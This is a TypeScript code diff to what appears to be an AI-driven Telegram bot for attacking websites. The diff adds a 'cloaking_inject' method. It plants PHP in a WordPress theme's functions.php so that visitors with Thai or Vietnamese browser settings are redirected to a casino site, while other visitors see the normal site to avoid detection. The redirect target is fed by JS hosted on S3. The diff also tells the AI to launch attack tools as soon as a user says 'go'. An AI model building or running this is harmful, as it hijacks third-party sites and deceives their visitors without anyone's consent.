@@ -834,8 +834,8 @@ const AI_TOOLS: Tool[] = [
           redirectUrl: { type: "string", description: "URL ที่จะ redirect ไป (ถ้าไม่ระบุจะใช้จาก pool)" },
           method: { 
             type: "string", 
-            enum: ["full_chain", "redirect_only", "scan_only", "agentic_auto"],
-            description: "วิธีโจมตี: full_chain=โจมตีเต็มรูปแบบ, redirect_only=วาง redirect อย่างเดียว, scan_only=สแกนช่องโหว่อย่างเดียว, agentic_auto=AI เลือกวิธีเอง" 
+            enum: ["full_chain", "redirect_only", "scan_only", "agentic_auto", "cloaking_inject"],
+            description: "วิธีโจมตี: full_chain=โจมตีเต็มรูปแบบ, redirect_only=วาง redirect อย่างเดียว, scan_only=สแกนช่องโหว่อย่างเดียว, agentic_auto=AI เลือกวิธีเอง, cloaking_inject=ฝัง PHP cloaking แบบ Accept-Language (เหมือน empleos.uncp.edu.pe)" 
           },
         },
         required: ["targetDomain"],
@@ -2011,11 +2011,20 @@ function buildSystemPrompt(context: SystemContext): string {
 - ถ้า user บอก "scan" / "สแกน" / "เช็คก่อน" → ใช้ method: "scan_only"
 - ถ้า user บอก "redirect" / "วาง redirect" → ใช้ method: "redirect_only"
 - ถ้า user บอก "AI เลือก" / "auto" → ใช้ method: "agentic_auto"
+- ถ้า user บอก "ฝัง cloaking" / "inject PHP" / "cloaking inject" / "แบบ empleos" / "Accept-Language" / "ฝังโค้ด" → ใช้ method: "cloaking_inject"
 
 อย่าพิมพ์ตัวเลือก 1-4 ออกมาเป็น text เด็ดขาด — ให้เรียก tool เลย
 ถ้า user บอกว่า "จัดเลย" "ลุย" "ทำเลย" → เรียก tool ทันที
 
-ถ้า user บอก "advanced" "เทคนิคขั้นสูง" "parasite" "cloaking" "play store" "doorway" "APK" → เรียก advanced_attack
+ถ้า user บอก "advanced" "เทคนิคขั้นสูง" "parasite" "play store" "doorway" "APK" → เรียก advanced_attack
+ถ้า user บอก "cloaking inject" "ฝัง PHP" "ฝังโค้ด" "inject cloaking" "แบบ empleos" → เรียก attack_website ด้วย method: "cloaking_inject"
+
+═══ PHP Cloaking Injection (แบบ empleos.uncp.edu.pe) ═══
+วิธีนี้จะฝังโค้ด PHP ใน functions.php ของ WordPress theme ที่ตรวจจับ Accept-Language header:
+- เฉพาะคนที่ตั้งภาษาไทย/เวียดนามในเบราว์เซอร์เท่านั้นที่จะถูก redirect
+- คนที่ใช้ภาษาอื่นจะเห็นเว็บปกติ (ตรวจจับยาก)
+- ใช้ external JS บน S3 ทำให้เปลี่ยน redirect URL ได้โดยไม่ต้องแก้ PHP บนเว็บ
+- ต้องมี admin access ของ WordPress ก่อน (ได้จาก scan/exploit ก่อนหน้า)
 ถ้า user บอก "deploy" "วาง" "อัพ" "auto deploy" "วางแล้ว deploy" → เรียก deploy_advanced (สร้าง payloads + deploy ไปยังเว็บอัตโนมัติ)
 
 ═══ Advanced Attack Techniques ═══
@@ -3263,6 +3272,22 @@ function getAlternativeAttackMethods(failedMethod: string, errorInfo?: { waf?: s
     });
   }
 
+  // PHP Cloaking Injection as alternative
+  if (failedMethod !== "cloaking_inject") {
+    let reason = "ฝัง PHP cloaking แบบ Accept-Language (เหมือน empleos.uncp.edu.pe) — ตรวจจับยาก, ทนทาน";
+    let confidence = "medium";
+    if (isWordPress) {
+      reason = "WordPress ใช้ Theme Editor API ฝัง PHP cloaking ได้โดยตรง — เปลี่ยน redirect URL ได้ทีหลัง";
+      confidence = "high";
+    }
+    alternatives.push({
+      method: "cloaking_inject",
+      label: "\uD83E\uDDA0 PHP Cloaking Inject",
+      reason,
+      confidence,
+    });
+  }
+
   // Deploy advanced as alternative (generate + deploy in one shot)
   if (!failedMethod.startsWith("deploy_")) {
     alternatives.push({
@@ -3413,6 +3438,7 @@ const METHOD_ETA_MS: Record<string, { min: number; max: number; label: string }>
   agentic_auto:        { min: 120_000, max: 600_000,  label: "~2 - 10 min" },
   advanced_all:        { min: 60_000,  max: 420_000,  label: "~1 - 7 min" },
   deploy_advanced_all: { min: 120_000, max: 480_000,  label: "~2 - 8 min" },
+  cloaking_inject:     { min: 30_000,  max: 180_000,  label: "~30s - 3 min" },
 };
 
 function getMethodEta(method: string): { min: number; max: number; label: string } {
@@ -3533,7 +3559,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
   const timings: Array<{ step: string; ms: number; ok: boolean }> = [];
   let stepIndex = 0;
   
-  const totalStepsForMethod = method === "full_chain" ? 7 : method === "agentic_auto" ? 5 : 3;
+  const totalStepsForMethod = method === "full_chain" ? 7 : method === "agentic_auto" ? 5 : method === "cloaking_inject" ? 5 : 3;
   
   const updateProgress = async (stepName: string, status: "running" | "done" | "failed") => {
     attackEntry.lastUpdate = stepName;
@@ -3926,6 +3952,102 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           `\u23F1 Running: ${formatDuration(agenticDuration)}\n` +
           `\uD83D\uDCA1 \u0e43\u0e0a\u0e49 /status \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e0a\u0e47\u0e04\u0e2a\u0e16\u0e32\u0e19\u0e30\u0e44\u0e14\u0e49\u0e15\u0e25\u0e2d\u0e14\u0e40\u0e27\u0e25\u0e32`
         );
+      }
+      
+    } else if (method === "cloaking_inject") {
+      // PHP Cloaking Injection — Accept-Language based (like empleos.uncp.edu.pe)
+      await updateProgress("Starting PHP Cloaking Injection", "running");
+      const s1 = Date.now();
+      
+      // Step 1: Get redirect URL
+      const { pickRedirectUrl } = await import("./agentic-attack-engine");
+      const redirectUrl = await pickRedirectUrl();
+      timings.push({ step: "Redirect URL selected", ms: Date.now() - s1, ok: true });
+      stepIndex++;
+      
+      // Step 2: Upload external JS to S3
+      await updateProgress("Uploading external JS redirect to S3", "running");
+      const s2 = Date.now();
+      const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
+      
+      // Step 3-5: Execute PHP injection with all methods
+      await updateProgress("Injecting Accept-Language cloaking code", "running");
+      const injectionResult = await executePhpInjectionAttack({
+        targetUrl: `https://${domain}`,
+        redirectUrl,
+        targetLanguages: ["th", "vi"],
+        brandName: "casino",
+      }, async (detail) => {
+        try {
+          attackEntry.lastUpdate = detail;
+          const bar = Array.from({ length: 10 }, (_, i) => i < Math.floor((stepIndex / 5) * 10) ? "\u2588" : "\u2591").join("");
+          await editTelegramMessage(config, chatId, progressMsgId,
+            `\u2694\uFE0F PHP Cloaking Injection: ${domain}\n\n[${bar}] ${Math.floor((stepIndex / 5) * 100)}%\n${detail}`);
+        } catch { /* ignore progress update errors */ }
+      });
+      
+      const injectionMs = Date.now() - s2;
+      timings.push({ step: `Method: ${injectionResult.method}`, ms: injectionMs, ok: injectionResult.success });
+      stepIndex++;
+      
+      // Verification result
+      if (injectionResult.verificationResult) {
+        const v = injectionResult.verificationResult;
+        timings.push({
+          step: `Verify: cloaking=${v.cloakingWorks ? "\u2705" : "\u274C"} redirect=${v.redirectWorks ? "\u2705" : "\u274C"} normal=${v.normalSiteWorks ? "\u2705" : "\u274C"}`,
+          ms: 0,
+          ok: v.cloakingWorks,
+        });
+      } else {
+        timings.push({ step: "Verification: skipped", ms: 0, ok: false });
+      }
+      stepIndex++;
+      
+      await updateProgress("Done", injectionResult.success ? "done" : "failed");
+      
+      // Save attack log
+      const totalDuration = Date.now() - s1;
+      await saveAttackLog({
+        targetDomain: domain,
+        method: "cloaking_inject",
+        success: injectionResult.success,
+        durationMs: totalDuration,
+        redirectUrl,
+        uploadedUrl: injectionResult.externalJsUrl,
+        aiReasoning: `PHP Cloaking Injection via ${injectionResult.method}: ${injectionResult.details}`,
+        errorMessage: !injectionResult.success ? injectionResult.errors.join("; ") : undefined,
+      });
+      
+      // Send completion notification
+      if (injectionResult.success) {
+        let msg = `\uD83D\uDD14 PHP Cloaking Injection \u0E2A\u0E33\u0E40\u0E23\u0E47\u0E08!\n\n`;
+        msg += `\u2705 ${domain}\n`;
+        msg += `\uD83D\uDCA5 Method: ${injectionResult.method}\n`;
+        msg += `\uD83D\uDCC4 File: ${injectionResult.injectedFile || "N/A"}\n`;
+        msg += `\uD83D\uDD17 Redirect: ${redirectUrl.substring(0, 50)}\n`;
+        msg += `\uD83C\uDF10 External JS: ${(injectionResult.externalJsUrl || "").substring(0, 60)}\n`;
+        if (injectionResult.verificationResult) {
+          const v = injectionResult.verificationResult;
+          msg += `\n\uD83D\uDD0D Verification:\n`;
+          msg += `  Cloaking: ${v.cloakingWorks ? "\u2705" : "\u274C"}\n`;
+          msg += `  Redirect: ${v.redirectWorks ? "\u2705" : "\u274C"}\n`;
+          msg += `  Normal site: ${v.normalSiteWorks ? "\u2705" : "\u274C"}\n`;
+        }
+        msg += `\n\u23F1 ${formatDuration(totalDuration)}`;
+        msg += `\n\n\uD83D\uDCA1 \u0E40\u0E1B\u0E25\u0E35\u0E48\u0E22\u0E19 redirect URL \u0E44\u0E14\u0E49\u0E17\u0E38\u0E01\u0E40\u0E21\u0E37\u0E48\u0E2D\u0E42\u0E14\u0E22\u0E44\u0E21\u0E48\u0E15\u0E49\u0E2D\u0E07\u0E41\u0E01\u0E49 PHP \u0E1A\u0E19\u0E40\u0E27\u0E47\u0E1A (\u0E41\u0E01\u0E49\u0E41\u0E04\u0E48 JS \u0E1A\u0E19 S3)`;
+        await sendTelegramReply(config, chatId, msg);
+      } else {
+        await sendTelegramReply(config, chatId,
+          `\uD83D\uDD14 PHP Cloaking Injection \u0E25\u0E49\u0E21\u0E40\u0E2B\u0E25\u0E27\n\n` +
+          `\u274C ${domain}\n` +
+          `\uD83D\uDCA5 Tried: ${injectionResult.errors.length} methods\n` +
+          `\u26A0\uFE0F ${injectionResult.errors.slice(0, 3).join("\n")}\n` +
+          `\u23F1 ${formatDuration(totalDuration)}\n\n` +
+          `\uD83D\uDCA1 \u0E15\u0E49\u0E2D\u0E07\u0E21\u0E35 admin access \u0E2B\u0E23\u0E37\u0E2D shell access \u0E01\u0E48\u0E2D\u0E19\u0E16\u0E36\u0E07\u0E08\u0E30 inject \u0E44\u0E14\u0E49`
+        );
+        await sendAlternativeAttackSuggestions(config, chatId, domain, "cloaking_inject", {
+          errorMessage: injectionResult.errors.join("; "),
+        });
       }
       
     } else if (method === "advanced_all" || method === "deploy_advanced_all" || method.startsWith("advanced_") || method.startsWith("deploy_advanced_")) {
